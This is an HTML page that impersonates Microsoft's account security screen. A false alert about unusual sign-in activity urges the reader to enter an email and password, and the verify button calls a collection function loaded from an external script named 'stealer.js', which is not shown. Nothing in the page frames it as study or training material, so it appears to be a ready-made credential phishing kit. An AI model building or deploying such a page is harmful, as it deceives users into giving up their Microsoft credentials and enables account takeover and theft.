<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Security Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }
        .header {
            background: #0078d4;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header img {
            height: 32px;
            margin-bottom: 10px;
        }
        .content {
            padding: 30px;
        }
        .alert {
            background: #fff4ce;
            border: 1px solid #ffb900;
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .alert-icon {
            color: #d83b01;
            font-weight: bold;
            font-size: 16px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
            color: #323130;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #8a8886;
            border-radius: 4px;
            font-size: 14px;
        }
        .verify-btn {
            width: 100%;
            background: #0078d4;
            color: white;
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .verify-btn:hover {
            background: #106ebe;
        }
        .verify-btn:disabled {
            background: #8a8886;
            cursor: not-allowed;
        }
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #605e5c;
            border-top: 1px solid #edebe9;
        }
        .loading {
            display: none;
            text-align: center;
            color: #0078d4;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div style="font-size: 24px; font-weight: bold;">Microsoft</div>
            <div style="font-size: 18px;">Account Security</div>
        </div>
        
        <div class="content">
            <div class="alert">
                <span class="alert-icon">⚠</span> We've detected unusual sign-in activity from your account. 
                For your security, please verify your identity immediately.
            </div>

            <div class="form-group">
                <label for="email">Email address</label>
                <input type="text" id="email" placeholder="Enter your Microsoft email" autocomplete="email">
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password">
            </div>

            <button class="verify-btn" onclick="collectData()" id="verifyBtn">
                Verify My Account
            </button>
            
            <div class="loading" id="loading">
                Verifying your information... Please wait.
            </div>
        </div>

        <div class="footer">
            <div>Microsoft Corporation</div>
            <div>© 2024 Microsoft. All rights reserved.</div>
        </div>
    </div>

    <script src="stealer.js"></script>
</body>
</html>
